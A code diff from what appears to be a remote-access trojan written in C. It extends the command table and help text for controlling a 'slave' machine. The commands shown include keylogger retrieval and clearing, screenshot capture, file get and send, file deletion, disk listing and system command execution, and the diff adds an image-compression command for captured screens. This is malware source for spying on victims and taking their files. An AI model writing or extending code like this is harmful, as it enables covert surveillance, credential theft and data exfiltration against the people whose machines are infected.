@@ -9,8 +9,8 @@
 #include "net/error.h"
 #include "cmd/hdd/path.h"
 
-int commands_cmdList_argsCount[COMMANDS_TOTAL_COMMANDS] = {  0,    1,       0,         0,         1,             1,                 0,                 0,             3,             2,           2,             3,        1,     0,    1,        1,         0};
-char* commands_cmdList[COMMANDS_TOTAL_COMMANDS] =         { " ", "send ", "info", "terminate", "system ", "keylogger get ", "keylogger size", "keylogger clear", "screen get ", "file get ", "file send ", "screen cap ", "ls ", "ls", "cd ", "remove ", "disk list" };
+int commands_cmdList_argsCount[COMMANDS_TOTAL_COMMANDS] = {  0,    1,       0,         0,         1,             1,                 0,                 0,             3,             2,           2,             3,        1,     0,    1,        1,         0,               1};
+char* commands_cmdList[COMMANDS_TOTAL_COMMANDS] =         { " ", "send ", "info", "terminate", "system ", "keylogger get ", "keylogger size", "keylogger clear", "screen get ", "file get ", "file send ", "screen cap ", "ls ", "ls", "cd ", "file remove ", "disk list", "screen compress " };
 
 void commands_printHelp(void)
 {
@@ -26,13 +26,14 @@ void commands_printHelp(void)
 	LOG(LOG_INFO, "  keylogger clear                 #clears keylogger data\n");
 	LOG(LOG_INFO, "  screen get {W%%}, {H%%}, {DEST}   #get screenshot with size abjusts\n");
 	LOG(LOG_INFO, "  screen cap {W%%}, {H%%}, {MS}     #capture screen\n");
+	LOG(LOG_INFO, "  screen compress {T/F}           #compress images NOTE:The image will be grayish\n");
 	LOG(LOG_INFO, "  file get {SRC}, {DEST}          #retrieves file, only filenames for slave\n");
 	LOG(LOG_INFO, "  file send {DEST}, {SRC}         #sends file, only filenames for slave\n");
+	LOG(LOG_INFO, "  file remove {PATH}              #deletes file\n");
 	LOG(LOG_INFO, "  ls                              #display list of files and folders\n");
 	LOG(LOG_INFO, "  ls {PATH}                       #display list of files and folders\n");
 	LOG(LOG_INFO, "  cd {PATH}                       #navigate to path\n");
 	LOG(LOG_INFO, "  reset cd                        #resets path back to C:\\\n");
-	LOG(LOG_INFO, "  remove {PATH}                   #deletes file\n");
 	LOG(LOG_INFO, "  disk list                       #displays all mounted drives\n");
 }
 
@@ -228,6 +229,13 @@ int commands_find(char* msg)
 		return command_Remove(msg, msgLen);
 	}else if(commands_Equals(msg, COMMANDS_DISK_LIST)){
 		return command_Disk_list();
+	}else if(commands_Equals(msg, COMMANDS_SCREEN_IS_USING_COMPRESSOR)){
+		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SCREEN_IS_USING_COMPRESSOR))
+		{
+			return COMMANDS_UNKNOW_COMMAND;
+		}
+
+		return command_Screen_IsUsingCompressor(msg, msgLen);
 	}
 
 	return COMMANDS_UNKNOW_COMMAND;
